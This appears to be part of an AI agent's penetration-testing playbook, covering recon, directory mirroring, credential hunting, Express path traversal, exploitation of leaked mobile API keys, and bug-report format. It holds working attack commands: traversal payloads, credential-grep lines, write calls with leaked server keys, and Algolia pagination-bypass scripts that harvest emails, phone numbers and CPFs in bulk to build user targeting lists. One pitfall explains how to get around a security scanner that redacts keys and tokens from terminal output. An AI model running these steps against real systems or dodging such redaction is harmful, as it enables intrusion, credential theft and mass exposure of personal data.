1. **Clone the latest release tag** — `git clone --depth 1 --branch vX.Y.Z <repo> <dir>`
2. **Git diff against the previous audited version** — check new/modified/removed files, especially across dependency boundaries
3. **Systematically check each known vulnerability's code path** — grep for the vulnerable functions/patterns. Track status per version: `🟢 WORKS` / `🟡 HARDER` / `🔶 CHANGED` / `🔴 BROKEN`
4. **Hunt for new attack surface** in every new/modified file — new API endpoints, new protocol integrations, new code with untrusted input, new dependency versions
5. **Output a structured status matrix** — one row per vulnerability, version-by-version
6. **Document new findings immediately** — file, line, code snippet, vector, severity

**Pitfall:** Go code paths for a vulnerability may still exist but be blocked at runtime by a different layer (e.g., llama.cpp vocabulary validation blocking GGUF weight hijack). Always distinguish "code path exists" from "runtime exploitable."

**Pitfall:** When checking binary-dependent vulnerabilities (C++ backends, subprocesses), check the dependency version file (e.g., `LLAMA_CPP_VERSION` in Ollama). New dependency versions may introduce accidental breaks OR fixes not visible in Go source.

**Pitfall:** Don't test against a running instance unless asked or the code analysis is inconclusive. Static validation is faster, more thorough, and doesn't risk the target environment. If the user needed live testing, they'd say so.

---

## D — Recon & Asset Discovery

See `references/recon-methodology.md` for full recon pipeline.

### D.1 — OpenAPI/Swagger Spec Discovery

Always check for publicly accessible API specs. Common paths:
```
/openapi.json
/openapi.yaml
/swagger.json
/swagger/v1/swagger.json
/api/swagger.json
/api-docs
/api-docs/swagger.json
/docs
/documentation
/.well-known/openapi.json
/spec
/spec.json
/api/spec
```

**What to extract from specs:**
1. List all endpoints (especially `/internal/*`, `/admin/*`, `/private/*`, `/system/*`)
2. Check auth requirements per endpoint (look for `security: []` or missing auth)
3. Extract parameter schemas for fuzzing
4. Identify ID formats for enumeration patterns
5. Map business-critical flows (payments, withdrawals, exports)

### D.1.5 — CRT.sh Historical Subdomain Discovery

**When:** Standard subdomain bruteforce (300+ common names) finds nothing new. You need subdomains that existed in the past or have certificates issued for them.

**Technique:** Query crt.sh Certificate Transparency logs. The API sometimes fails (502), fall back to HTML grep.

```bash
# API JSON
curl -s 'https://crt.sh/?q=%25.target.com&output=json' 2>/dev/null | python3 -c "
import sys, json
certs = json.load(sys.stdin)
subs = set()
for cert in certs[:100]:
    for n in cert.get('name_value', '').split('\n'):
        if n.strip().endswith('.target.com'):
            subs.add(n.strip().lower())
for s in sorted(subs): print(s)
"

# HTML fallback (API down)
curl -s 'https://crt.sh/?q=%25.target.com' | grep -oP '[a-z0-9][a-z0-9-]*\.target\.com' | sort -u
```

**Reveals:** Decommissioned subdomains (`admin`, `api2`, `tokenizer`, `hooks`) missed by brute-force. Verify each via DNS resolution (`host -t A`). NXDOMAIN = removed, not takeoverable — but documents past infrastructure.

**Pitfall:** Wildcard certs (`*.target.com`) appear as fake subdomains. Filter them out.

### D.2 — ID Format Enumeration Patterns

Common ID prefixes that reveal enumeration surface:
| Prefix | Entity | Example |
|---|---|---|
| `cust_` | Customer | `cust_gE3XPHcpt6W52GB0EDFjL2WA` |
| `bill_` | Billing/Checkout | `bill_kUMZycjRmnachy3bBNeHXXPD` |
| `pix_char_` | PIX charge | `pix_char_qAeemH4zqLkhTTkQfUyRRXXe` |
| `card_` | Card charge | `card_...` |
| `tran_` | Transaction | `tran_fapDCymBkFnDDfYxCw6ggjkG` |
| `store_` | Store | `store_DxsBeBLKUJ2GBLKDjJbMrdC1` |
| `key_` | API key | `key_Bq5AFTxMDTSMKnrgSLJ0EDQ3` |
| `acco_` | Account | `acco_56QkyrJKpzxHt5qX3qdnU6pu` |

Test cross-tenant access by using IDs from one account against another's API key.

### D.2.5 — SPA with External API Domain Pattern

**When:** Analyzing SPA JS bundles (Angular, React, Vue), always check if the API base URL points to a completely different domain.

**Pattern:** SPAs hosted on CDN/S3 (e.g., `adm.target.com`) often call APIs on entirely separate infrastructure (e.g., `api.target.com` or `target-backend.elasticbeanstalk.com`).

**Why it matters:**
- The API backend may bypass Cloudflare/WAF protections
- Different tech stacks = different attack surfaces (e.g., Angular frontend → ASP.NET backend)
- API subdomains may have weaker auth or different CORS policies
- Direct API access can reveal internal endpoints not exposed through the CDN

**Technique:**
```bash
# Extract API base URL from JS bundle
grep -oE 'baseURL["\s:=]+["\x60][^"\x60]+["\x60]' bundle.js
grep -oE 'apiUrl["\s:=]+["\x60][^"\x60]+["\x60]' bundle.js
grep -oE 'environment["\s:=]+[^,;'\'']+' bundle.js

# Also grep for full URLs
grep -oP 'https?://[^"'\''\\x60<>\s]{5,120}' bundle.js | sort -u
```

**Real-world example (membership-org engagement):** `adm.example-org.tld` (Angular on S3/CloudFront) pointed to `https://api.example-org.tld/api` — an IIS 8.0/ASP.NET backend on AWS (<origin-ip>) with no Cloudflare protection. The `/api/token` endpoint accepted credentials and returned structured JSON errors.

### D.2.6 — Cloudflare HTTP 525 vs 1010 Distinction

**When:** Probing subdomains behind Cloudflare and getting errors.

| Error | Meaning | Action |
|-------|---------|--------|
| **525** | SSL handshake failed between Cloudflare and origin | Origin server is down or SSL misconfigured. Not a WAF block. Try later or look for alternate access. |
| **1010** | Cloudflare WAF "Access Denied" — bot detection | Cloudflare is actively blocking. Try browser-like User-Agent, Referer, Origin headers. |
| **502** | Bad Gateway — origin returned invalid response | Origin is up but misconfigured. May still be exploitable. |
| **403** | Forbidden — could be Cloudflare or origin | Test with browser UA to distinguish. |

**Pitfall:** Don't confuse 525 (SSL error) with 1010 (WAF). They require completely different bypass strategies.

---

When encountering an unknown IoT/Android device on the network (especially Chinese OEM TV boxes):

**Quick triage:**
1. `nmap -sS --top-ports 200 <IP>` — check for ADB (5555), HTTP (80/443), UPnP
2. `adb connect <IP>:5555` — if ADB open with no auth, full shell access
3. `adb shell pm list packages` → identify suspicious system apps
4. `adb pull` suspicious APKs → `apktool d` → grep for Retrofit interfaces
5. Extract API server URL → assess server for vulns + supply chain risks

**Key supply chain risk:** If the device's app store pulls APKs from a central server (common in Chinese TV boxes), compromising that server = ability to push malicious code to all devices. Check for `forceApps` or `forceUpgrade` endpoints.

**Reference:** `references/iot-supply-chain-assessment.md`

See `references/wordlists.md` for IoT-specific wordlists.

---

### D.3 — Vanilla SPA Source Code Extraction

Many attacker-built C2 panels and dashboards are vanilla SPAs with the entire client logic in a single `/app.js` file. Always check:

```bash
# Check for a single app.js with full client source
curl -s http://target/app.js | head -5

# If it's a real JS file (not the SPA shell), save it
curl -s http://target/app.js -o /tmp/target_app.js
wc -l /tmp/target_app.js
```

**What to extract from vanilla SPA source:**
- All API endpoints (search for `/api/` strings)
- Auth mechanism (localStorage token key, Authorization header format)
- Protocol details (command formats, response parsing)
- Infrastructure details (DNS C2, beacon intervals, download paths)

**Real-world example:** `references/rpx-c2-analysis.md` — RPX malware C2 panel where `/app.js` revealed the complete DNS-based C2 protocol.

### D.4 — Exposed Directory Listing Analysis (Apache/Nginx Index Of)

**When:** You find an Apache/Nginx-style directory listing (e.g., `Index of /` with file links). These are goldmines — developers dump debugging tools, configs, backups, and logs into them and forget.

**Workflow:**

#### 1. Mirror the entire directory

```bash
wget -r -np -nH --cut-dirs=1 --timeout=10 --tries=2 -e robots=off http://target:port/path/
```

**Flags explained:**
- `-r` — recursive
- `-np` — no parent (stay in this directory only)
- `-nH` — no host-prefixed directories
- `--cut-dirs=1` — strip the top-level path from local filenames
- `-e robots=off` — ignore robots.txt

#### 2. Systematic file triage (priority order)

Read files in this order for maximum credential density:

| Priority | File type | What to look for |
|---|---|---|
| **1** | `.log` files (largest first) | JWT tokens, payment transactions, CPFs/SSNs, card data, API requests/responses, system paths |
| **2** | `.json` files | Invoice data, customer records, config exports, webhook payloads |
| **3** | PHP source files | Hardcoded API keys, DB credentials, SMTP passwords, internal endpoints, auth bypass logic |
| **4** | `.pem` / `.crt` / `.key` | SSL certificates (check for PRIVATE KEY in the same file) |
| **5** | Backup files (`.backup`, `.old`, `~`) | Previous versions with different creds, debug configs, unredacted values |
| **6** | SMTP/email config files | `send-email-*.php`, `test-smtp*.php` — look for login credentials |
| **7** | Proxy files (`proxy-*.php`) | These connect to backend databases — may expose live customer data |
| **8** | HTML/JS app files | Tokenizer code, payment forms with hardcoded card numbers, API endpoints |
| **9** | Subdirectories (`certificates/`, `backups/`, `logs/`) | Same analysis recursively |

#### 3. Credential hunting patterns in source files

**Find all files containing credential patterns:**
```bash
grep -rl "senha\|password\|client_secret\|ClientId\|ClientSecret\|CLIENT_ID\|CLIENT_SECRET" *.php *.html *.txt *.json *.js 2>/dev/null
```
This quickly surfaces files that have credentials without reading every file.

**Base64 passwords in SMTP test scripts:**
```bash
# In test-smtp-simple.php, the auth exchange often shows:
#   Enviando username (base64): <base64-username>
#   Enviando password (base64): <base64-password>
#   Password response: 235 Authentication succeeded
#                                                      ^^^^^^^^^^^^^^^^
# A "235" response means the authentication WORKED.
# Decode the base64 values:
echo "<base64-password>" | base64 -d
# → the plaintext SMTP password
```

**Hardcoded test credit cards in payment forms:**
```php
// Look for these patterns in HTML/PHP
'cardNumber' => '<16-digit PAN>'
'cardCvv' => '<cvv>'
```
These are often real test cards with real CVVs. Document them.

**API credentials in source code:**
Search for patterns like `client_id`, `client_secret`, `api_key`, `access_token`, `bearer`, `Authorization`.

**SMTP credentials:**
PHP files named `test-smtp*`, `send-email*`, `email-config*` often contain SMTP hostname, port, username, and base64-encoded passwords.

#### 4. Cross-file correlation

Correlate findings across files for maximum impact:
- Log shows `charge_id` → JSON file shows `transacao_id` with status → invoice log shows payment was settled → customer data proxy shows PII
- PEM certificate issuer = the payment gateway → credential analysis shows Client ID/Secret → log shows payment tokens being generated
- Test SMTP script shows working creds → email monitoring dashboard shows the same domain

**Common file naming patterns to look for:**
- `*bypass*` — anti-fraud bypass, auth bypass
- `*debug*` — debug endpoints, detailed logs
- `*credenciais*` / `*credential*` — credential testing/analysis
- `*backup*` — previous versions (may have unredacted data)
- `*test*` — test scripts with hardcoded values
- `*proxy*` — backend API proxies
- `*efi*` / `*pix*` / `*pagamento*` — Brazilian payment gateway files
- `*monitor*` — monitoring dashboards
- `*log` — application logs with transaction data

**Key pitfall:** The `security scanner` redacts private keys and tokens from terminal output. Use `cat` directly or write the file and read back with `read_file` to see actual contents vs. redacted output.

**Pitfall:** Large log files (>400K) may time out during single-curl downloads. Use `wget -r` instead of individual `curl` calls — it handles the full mirror reliably.

**Pitfall:** Some files may be stubs that return PHP execution output (JSON responses) rather than source code. If `cat file.php` returns `{"success":false}` instead of PHP code, that's the live endpoint output, not the source. The actual source may be elsewhere.

**Field example (sanitized):** an exposed payment-integration directory on a non-standard port, 114 files / 1.4MB, held:
- a 480K log file with ~1,500 lines of production payment transactions
- ~126,000 customer records reachable through a proxy endpoint
- a hardcoded card number with CVV and expiry, reused as a form default
- working SMTP credentials (base64 in a `test-smtp*.php` script)
- a payment-gateway PEM certificate with its private key
- anti-fraud bypass code
- JWT tokens, charge IDs, and national ID numbers

Report the counts and types, never the values.

#### 5. Presenting findings

When summarizing findings, present them as a terse numbered/typed list with no emojis, no decorative formatting. One item per line with count and type. Example:
```
1 credit card (with CVV)
126,303 CPFs with full PII
2 EFI API key pairs
1 working SMTP
```

---

### D.5 — Payment Gateway Withdrawal & Financial Flow Testing

**When:** Testing a payment gateway or FinTech target with withdrawal/financial operation features.

**Full reference:** `references/payment-gateway-withdrawal-testing.md`

**Quick workflow:**
1. Check 2FA status (`GET /app/2fa/status`) — withdrawals usually require 2FA enabled
2. Check balance and limits (`GET /app/analytics/withdraw-metrics`) — daily limit, available balance
3. Get 6-digit code from user's authenticator app
4. Exchange for verification token (`POST /app/2fa/verify-code` with `{code: "..."}`)
5. Call withdrawal create with token + amount + pix key info
6. Handle errors: min amount (often 300 cents = R$3.00), daily limit, insufficient balance
7. Decode auth-storage cookie from localStorage — URL-encoded JSON with account flags

**Pix key types:** CNPJ, CPF, EMAIL, PHONE, RANDOM.

**Pitfall (TOTP code timing):** TOTP codes expire every 30 seconds. When testing 2FA flows (withdrawals, payouts), have the entire request ready BEFORE asking the user for their code. A single shell quoting error or wrong auth method wastes the window and frustrates the user. Workflow: (1) prepare the exact curl/python command, (2) ask user for code, (3) paste code and execute immediately — no intermediate debugging.

### D.6 — Express Static Path Traversal

When Express serves static files with `express.static(__dirname, { index: false })`, the `/../` path traversal can leak server source code:

```bash
# Try reading server source files
curl -s "http://target/../server.js"
curl -s "http://target/../middleware/auth.js"
curl -s "http://target/../package.json"
curl -s "http://target/../models/User.js"
```

**What to look for in leaked source:**
- Hardcoded JWT secrets in middleware/auth.js
- MongoDB connection strings with credentials
- Unauthenticated route handlers
- Auth bypass conditions

See `references/express-static-path-traversal.md` for full technique details.

---

## G — Mobile API Key Exploitation

**When:** You have extracted API keys from a mobile app (APK/IPA) and need to test them against live services. This is the post-extraction phase after `apk-redteam-pipeline` or manual decompilation.

### G.1 — Key Triage Priority

Test keys in this order (highest impact first):

1. **RevenueCat / Stripe / payment keys** — subscriber data, subscription management, potential write access
2. **Algolia / ElasticSearch / search keys** — full index read, potential PII exposure
3. **Firebase / Supabase keys** — database access, storage, auth
4. **Sentry DSN** — event injection (low severity but confirms key validity)
5. **Giphy / CDN / utility keys** — quota abuse (lowest priority)

### G.2 — RevenueCat Key Testing

**Identify key type:**
- Public keys start with `rcb_` (web) or `goog_` / `appl_` (mobile)
- Server-side keys also use `goog_` / `appl_` prefix but have broader permissions

**Read tests:**
```bash
# Get subscriber data (works with both public and server-side keys)
curl -s -H "Authorization: Bearer <KEY>" \
  "https://api.revenuecat.com/v1/subscribers/<firebase_uid>"

# Get product entitlement mapping
curl -s -H "Authorization: Bearer <KEY>" \
  "https://api.revenuecat.com/v1/product_entitlement_mapping"
```

**Write tests (server-side keys only):**
```bash
# Identify/create subscriber
curl -s -X POST "https://api.revenuecat.com/v1/subscribers/identify" \
  -H "Authorization: Bearer <KEY>" \
  -H "Content-Type: application/json" \
  -d '{"app_user_id":"test_id","new_app_user_id":"test_renamed"}'
```

**⚠️ WARNING:** Server-side keys can create/modify production subscriber data. Use test UIDs that don't collide with real users. The `/subscribers/identify` endpoint creates records even for non-existent users.

**What to look for:**
- Subscriber entitlements (PRO, premium, etc.)
- Subscription IDs (app.example-fitness.tld, etc.)
- first_seen / last_seen dates
- management_url (Apple/Google subscription management)
- Cross-reference UIDs from other sources (Algolia, app config) to build user profiles

### G.3 — Algolia Key Testing

**Basic search:**
```bash
curl -s -X POST "https://<APP_ID>-dsn.algolia.net/1/indexes/<INDEX>/query" \
  -H "X-Algolia-Application-Id: <APP_ID>" \
  -H "X-Algolia-API-Key: <SEARCH_KEY>" \
  -H "Content-Type: application/json" \
  -d '{"query":"","hitsPerPage":10,"page":0}'
```

**Get total record count:**
```bash
curl -s -X POST "https://<APP_ID>-dsn.algolia.net/1/indexes/<INDEX>/query" \
  -H "X-Algolia-Application-Id: <APP_ID>" \
  -H "X-Algolia-API-Key: <SEARCH_KEY>" \
  -H "Content-Type: application/json" \
  -d '{"query":"","hitsPerPage":0}'
# Response: {"nbHits": 29932}
```

**Pagination bypass (1000 result limit):**

Algolia's free/search tier limits to 1000 results per query. To extract all records:

```python
# Strategy 1: Filter by post type / category
for filter_str in ["postType:image", "postType:workout", "postType:meal"]:
    payload = {"query":"","hitsPerPage":1000,"page":0,"filters":filter_str}

# Strategy 2: Alphabetical sweep
for letter in "abcdefghijklmnopqrstuvwxyz":
    payload = {"query":letter,"hitsPerPage":1000,"page":0}

# Strategy 3: Time-bucket filtering (if createdAtTs is indexed)
payload = {"query":"","hitsPerPage":1000,"page":0,
           "filters":"createdAtTs>=1771674750446 AND createdAtTs<1774266750446"}
```

**PII extraction from search results:**
```python
import re, json

email_pattern = re.compile(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}')
phone_pattern = re.compile(r'[\+]?[(]?[0-9]{2,3}[)]?[-\s\.]?[0-9]{4,5}[-\s\.]?[0-9]{4}')
cpf_pattern = re.compile(r'\d{3}\.?\d{3}\.?\d{3}-?\d{2}')

for post in all_posts:
    content = post.get("content", "")
    for email in email_pattern.findall(content):
        log_pii("email", email, post["userId"])
    for phone in phone_pattern.findall(content):
        if len(phone) >= 8:
            log_pii("phone", phone, post["userId"])
    for cpf in cpf_pattern.findall(content):
        log_pii("cpf", cpf, post["userId"])
```

### G.4 — Sentry DSN Testing

```bash
# Parse DSN: https://<PUBLIC_KEY>@<ORG_SUBDOMAIN>.ingest.sentry.io/<PROJECT_ID>
# Send test event
envelope = f'{{"event_id":"{event_id}","sent_at":"{now}","dsn":"{dsn}"}}\n{{"type":"event"}}\n{json.dumps(event)}\n'

curl -s -X POST "https://<ORG_SUBDOMAIN>.ingest.us.sentry.io/api/<PROJECT_ID>/envelope/" \
  -H "Content-Type: application/x-sentry-envelope" \
  -d "$envelope"
```

Most Sentry DSNs in mobile apps are ingestion-only (can send but not read). The main risk is event injection / log pollution.

### G.5 — Combined Attack Chains

The most powerful technique is chaining multiple leaked services:

1. **Algolia + RevenueCat:** Algolia provides UIDs and PII → RevenueCat provides subscription status → build premium user targeting list
2. **Algolia + Firebase:** Algolia provides UIDs → Firebase Auth provides user profiles (if rules allow)
3. **Any search index + admin UIDs:** Search index reveals admin user IDs → use as parameters in API calls to admin endpoints

### G.6 — Data Export Pattern

When dumping large datasets, use background processes with notifications:

```bash
# Write dump script, then run in background
python3 /tmp/dump_service.py 2>&1 &
# Use process(action='poll') to check progress
# Use process(action='wait') with timeout for bounded tasks
```

Export to both JSON (full data) and CSV (spreadsheet-friendly) formats. Always include:
- Raw data files (JSON)
- Summary statistics (counts, breakdowns)
- PII findings (separate file, handle with care)
- User ID list (for cross-referencing with other services)

---

## E — Report Writing

### E.1 — Report Structure

```
[Title] — [Severity]
Target: URL
Auth required: None / Valid key / Admin
Date: YYYY-MM-DD

## Executive Summary (2-3 sentences)

## Impact (who loses what, business context)

## Steps to Reproduce (numbered, with exact HTTP requests)

## Proof of Concept (curl commands that work copy-paste)

## CVSS Score

## Recommended Fix
```

### E.2 — Severity Classification

| Severity | Criteria | Example |
|---|---|---|
| CRITICAL | Full auth bypass + financial impact OR RCE | Unauthenticated payment manipulation |
| HIGH | Cross-tenant data leak OR auth bypass without direct $ impact | Cross-account transaction enumeration |
| MEDIUM | Business logic abuse with bounded impact | Unrestricted quantity on checkout |
| LOW | Information disclosure, missing headers | Verbose error messages |

### E.3 — Key Writing Rules

1. First sentence = exact impact ("An unauthenticated attacker can...")
2. Include exact HTTP requests in PoC — copy-paste reproducible
3. Under 600 words for the report body
4. Separate PoC file with full request/response pairs
5. State whether finding is sandbox-specific or likely in production
